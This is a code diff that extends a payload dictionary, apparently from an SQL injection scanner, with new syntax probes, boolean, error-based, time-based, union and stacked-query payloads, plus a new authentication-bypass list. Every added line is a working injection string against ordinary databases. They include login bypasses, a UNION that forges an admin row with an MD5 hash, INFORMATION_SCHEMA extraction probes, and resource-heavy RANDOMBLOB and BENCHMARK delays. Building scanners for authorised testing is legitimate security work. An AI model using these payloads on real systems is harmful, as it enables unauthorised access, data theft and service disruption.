@@ -7,15 +7,24 @@ PAYLOAD_TEMPLATES = {
     "syntax_probe": [
         "'", "\"", "')", "'))", "\'", "%27", "%22",
         "1'", "1\"", "1')",
+        "`", "``", ",", "/", "//", "\\", "\\\\", ";", "%00",
     ],
     "boolean_true": [
         "' OR 1=1 -- ", "' OR 'a'='a' -- ", "admin' OR '1'='1' -- ",
         "\" OR 1=1 -- ", "' AND 1=1 -- ", "admin' -- ",
         "' UNION SELECT 1,1,1 WHERE 1=1 -- ",
         "1 OR 1=1 -- ", "1) OR (1=1 -- ", "' OR 2>1 -- ", "' OR TRUE -- ",
+        "' HAVING 1=1 -- ",
+        "%' AND 1=1 AND '%'='",
+        "' AND RLIKE (SELECT CASE WHEN (1=1) THEN 0x61646d696e ELSE 0x28 END) AND 'a'='a",
+        "admin\" OR \"1\"=\"1",
+        "admin\") OR (\"1\"=\"1",
+        "' OR ''='",
     ],
     "boolean_false": [
         "' OR 1=2 -- ", "' AND 1=2 -- ", "1 OR 1=2 -- ", "1) OR (1=2 -- ",
+        "' HAVING 1=0 -- ",
+        "%' AND 1=0 AND '%'='",
     ],
     "error_based": [
         "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- ",
@@ -25,6 +34,7 @@ PAYLOAD_TEMPLATES = {
         "' OR CAST((SELECT VERSION()) AS NUMERIC) -- ",
         "' AND 1=CAST((SELECT sqlite_version()) AS INT) -- ",
         "' AND load_extension('nonexistent') -- ",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT VERSION()), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) -- ",
     ],
     "time_based": [
         "' OR SLEEP(5) -- ", "' AND SLEEP(5) -- ",
@@ -37,6 +47,9 @@ PAYLOAD_TEMPLATES = {
         "' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) -- ",
         "1' AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) -- ",
         "1' OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) -- ",
+        ",(SELECT * FROM (SELECT(SLEEP(5)))a)",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
+        "'+BENCHMARK(5000000,SHA1(1))+'",
     ],
     "union_probe": [
         "' UNION SELECT NULL -- ",
@@ -48,6 +61,7 @@ PAYLOAD_TEMPLATES = {
         "' UNION SELECT VERSION(),2,3 -- ",
         "' UNION SELECT @@VERSION,2,3 -- ",
         "1' ORDER BY 1 -- ", "1' ORDER BY 100 -- ",
+        "' UNION SELECT SUM(1) FROM INFORMATION_SCHEMA.TABLES -- ",
     ],
     "stacked_query": [
         "1'; SELECT SLEEP(3) -- ",
@@ -57,6 +71,13 @@ PAYLOAD_TEMPLATES = {
     "header_injection": [
         "' OR SLEEP(3) -- ", "' OR 1=1 -- ",
         "' UNION SELECT NULL -- ",
+    ],
+    "auth_bypass": [
+        "admin\" -- ",
+        "' or ''-'",
+        "' or '' '",
+        "\" or \"\"-\"",
+        "1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
     ],
 }
 
